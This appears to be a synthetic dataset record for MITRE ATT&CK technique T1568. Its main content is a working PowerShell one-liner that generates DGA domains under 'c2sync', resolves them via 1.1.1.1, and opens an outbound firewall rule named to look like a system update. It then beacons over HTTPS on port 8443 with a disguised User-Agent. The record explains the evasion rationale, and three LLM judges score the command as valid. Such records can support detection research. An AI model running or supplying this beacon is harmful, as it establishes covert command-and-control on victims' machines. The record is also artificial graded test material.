{
  "technique_id": "T1568",
  "platform": "Windows",
  "shell": "PowerShell",
  "command": "Invoke-Command -ScriptBlock { $seed=(Get-Date -Format 'yyyyMMdd')+$env:COMPUTERNAME.Length; $tlds=@('net','org','co'); $names=1..15|ForEach-Object { 'cdn{0}-{1}.c2sync.{2}' -f $_,$seed,($tlds[(Get-Random -Min 0 -Max $tlds.Count)]) }; netsh advfirewall firewall add rule name='sys_upd_8443' dir=out action=allow protocol=TCP remoteport=8443 | Out-Null; Clear-DnsClientCache; $dom=$names | Where-Object { Resolve-DnsName $_ -Server '1.1.1.1' -Type A -ErrorAction SilentlyContinue } | Select-Object -First 1; if($dom){ $ua='Mozilla/5.0 (Windows NT 10.0; Win64; x64)'; Invoke-WebRequest -Uri ('https://{0}:8443/beacon' -f $dom) -Headers @{ Host=$dom; 'User-Agent'=$ua } -TimeoutSec (Get-Random -Min 3 -Max 9) -UseBasicParsing } }",
  "explanation": "Generates DGA-based candidate domains, forces resolution via Cloudflare DNS, opens outbound TCP/8443, and performs an HTTPS beacon to the dynamically resolved domain.",
  "rationale_steps": [
    "Generate multiple domains using a time-and-hostseed DGA.",
    "Flush DNS cache and resolve candidates via a chosen resolver (1.1.1.1).",
    "Open egress on an uncommon port to reduce signature matches.",
    "Beacon to the first resolvable domain using HTTPS and a benign User-Agent."
  ],
  "obfuscation_level": "none",
  "id": "SYN-POWERSHELL-T1568-5b98f3ee-84d6188c",
  "source_prompt_hash": "5b98f3ee",
  "timestamp_utc": "2025-09-30T09:58:10.642945Z",
  "validation": {
    "syntax_ok": null,
    "llm_judgments": [
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed PowerShell with balanced quotes, braces, and parentheses, proper command separators, valid parameter names, and correct pipeline usage.",
        "semantic_score": 5,
        "semantic_justification": "The command fully implements the T1568 Dynamic Resolution technique by generating algorithm-based domain names using a date-based seed, attempting DNS resolution, creating a firewall rule for C2 traffic, and establishing an HTTPS beacon to the successfully resolved domain.",
        "combined_score": 5.0,
        "confidence": 0.95,
        "timestamp": "2025-10-02T05:47:27.479309Z"
      },
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "PowerShell scriptblock is well-formed with balanced quotes/braces, valid cmdlets/parameters, and proper pipelines/format operators.",
        "semantic_score": 4,
        "semantic_justification": "It algorithmically generates candidate domains, resolves them via a specified DNS server, and beacons to a resolved endpoint (T1568), though the firewall rule and DNS cache flush may require elevation and can fail under non-admin privileges.",
        "combined_score": 4.5,
        "confidence": 0.9,
        "timestamp": "2025-10-02T05:48:02.449986Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "All PowerShell cmdlets, syntax elements, string formatting, array definitions, and control flow are perfectly well-formed and correctly structured.",
        "semantic_score": 4,
        "semantic_justification": "The command accurately implements DGA-based domain generation, dynamic DNS resolution via an external server, and subsequent HTTPS beaconing, which aligns perfectly with T1568, but the `netsh` firewall rule would fail under the claimed 'None' privilege.",
        "combined_score": 4.5,
        "confidence": 0.95,
        "timestamp": "2025-10-02T05:58:58.861565Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 4.333,
    "llm_average_score": 4.667,
    "llm_verdict": "likely_match",
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}